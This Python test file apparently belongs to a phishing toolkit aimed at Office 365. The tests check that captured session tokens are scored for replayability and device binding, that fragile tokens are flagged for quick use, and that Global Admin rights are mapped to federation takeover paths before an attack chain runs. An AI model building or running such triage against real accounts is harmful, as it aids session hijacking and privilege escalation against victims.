"""The token tier, wired into the capture flow.

The point of these tests is the interconnection: a token set that lands in the store is
annotated THERE, so the verdict exists before an operator asks for it, and a chain run against
a device-bound session says so instead of spending the whole run on browser tasks that cannot
work.
"""
import base64
import json
import os
import sys
import time

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core import capture as cap  # noqa: E402
from core import chains  # noqa: E402
from core import session as S  # noqa: E402
from core import tokenintel as TI  # noqa: E402

pytestmark = pytest.mark.unit

GLOBAL_ADMIN = "62e90394-69f5-4237-9190-012177145e10"


def jwt(payload):
    def seg(obj):
        return base64.urlsafe_b64encode(
            json.dumps(obj, separators=(",", ":")).encode()).decode().rstrip("=")
    return seg({"alg": "RS256"}) + "." + seg(payload) + ".signature"


def record(**claims):
    rec = S.new_record("sid-1", phishlet="o365", campaign="wave1", ip="203.0.113.5")
    claims.setdefault("exp", time.time() + 600)
    rec["tokens"] = {"access_token": jwt(claims), "refresh_token": "RT-1",
                     "scope": claims.pop("scope", "openid profile offline_access")}
    return rec


class TestTheAnnotation:

    def test_a_plain_token_set_is_replayable_and_says_so(self):
        rec = record(scp="Mail.Read")
        intel = TI.annotate(rec)
        assert intel["replayability"] == "replayable"
        assert "Mail.Read" in intel["scopes"] and "offline_access" in intel["scopes"]
        assert "replayable" in TI.line(rec)

    def test_a_device_bound_token_is_flagged_before_the_operator_acts(self):
        rec = record(deviceid="dev-1")
        intel = TI.annotate(rec)
        assert intel["device_bound"] is True and intel["replayability"] == "not_replayable"
        assert "NOT replayable" in TI.line(rec)

    def test_a_cae_aware_token_is_fragile_and_urges_haste(self):
        rec = record(xms_cc=["cp1"])
        TI.annotate(rec)
        assert "act now" in TI.line(rec)

    def test_the_identity_rights_are_mapped_to_the_root_of_trust_paths(self):
        rec = record(wids=[GLOBAL_ADMIN], roles=["Directory.ReadWrite.All"])
        intel = TI.annotate(rec)
        paths = {row["path"]: row["verdict"] for row in intel["tier0"]}
        assert paths["federation"] in ("needs_a_call", "open")
        assert paths["endpoint_root"] == "not_reachable_from_a_session"
        assert "federation" in TI.summary(rec)

    def test_the_annotation_is_idempotent_for_unchanged_tokens(self):
        rec = record(scp="Mail.Read")
        first = TI.annotate(rec)
        again = TI.annotate(rec)
        assert first["fingerprint"] == again["fingerprint"]
        assert first["at"] == again["at"], "the verdict must not be recomputed needlessly"

    def test_changed_tokens_get_a_new_verdict(self):
        rec = record(scp="Mail.Read")
        first = TI.annotate(rec)["fingerprint"]
        rec["tokens"]["refresh_token"] = "RT-2"
        assert TI.annotate(rec)["fingerprint"] != first

    def test_a_record_without_tokens_reports_nothing_captured(self):
        assert "nothing captured" in TI.summary(S.new_record("sid-2"))
        assert TI.line(S.new_record("sid-2")) == ""

    def test_the_passkey_signal_is_carried_when_the_collector_has_it(self):
        rec = record(scp="Mail.Read")
        intel = TI.annotate(rec, intel={"mods": {"webauthn": {"supported": True}}})
        assert intel["passkey"]["verdict"] == "offers"


class TestTheStoreAnnotates:

    def test_a_token_set_landing_in_the_store_comes_out_annotated(self, tmp_path):
        db = cap.CaptureDB(os.path.join(str(tmp_path), "t.db"))
        rec = record(scp="Mail.Read", wids=[GLOBAL_ADMIN])
        db.session_save(rec)
        back = db.session_get("sid-1")
        assert back["token_intel"]["replayability"] == "replayable"
        assert back["token_intel"]["tier0"], "the posture must be stored with the session"
        assert back["token_intel"]["fingerprint"]

    def test_a_device_bound_capture_is_stored_as_not_replayable(self, tmp_path):
        db = cap.CaptureDB(os.path.join(str(tmp_path), "t2.db"))
        db.session_save(record(deviceid="dev-9"))
        assert db.session_get("sid-1")["token_intel"]["device_bound"] is True

    def test_a_credential_only_session_is_not_annotated(self, tmp_path):
        db = cap.CaptureDB(os.path.join(str(tmp_path), "t3.db"))
        rec = S.new_record("sid-3", phishlet="o365")
        rec["credentials"] = {"email": "a@b.test", "password": "x"}
        db.session_save(rec)
        assert not (db.session_get("sid-3").get("token_intel") or {})


class TestTheChainPreFlight:

    def test_a_device_bound_session_is_called_out_before_the_tasks_run(self):
        rec = record(deviceid="dev-1")
        out = chains.run_chain(rec, "recon", headless=True)
        assert out["token_tier"]["verdict"] == "not_replayable"
        assert out["token_tier"]["device_bound"] is True
        assert any(f["keyword"] == "token-tier" for f in out["findings"])
        assert "NOT replayable" in out["findings"][0]["line"]

    def test_a_replayable_session_adds_no_warning(self):
        rec = record(scp="Mail.Read")
        out = chains.run_chain(rec, "recon", headless=True)
        assert out["token_tier"]["verdict"] == "replayable"
        assert not [f for f in out["findings"] if f["keyword"] == "token-tier"]

    def test_the_tier0_paths_travel_with_the_chain_result(self):
        rec = record(wids=[GLOBAL_ADMIN], roles=["Directory.ReadWrite.All"])
        out = chains.run_chain(rec, "recon", headless=True)
        assert "federation" in out["token_tier"]["tier0"]

    def test_a_session_without_tokens_has_no_tier(self):
        out = chains.run_chain(S.new_record("sid-9", phishlet="o365"), "recon", headless=True)
        assert out["token_tier"] == {}
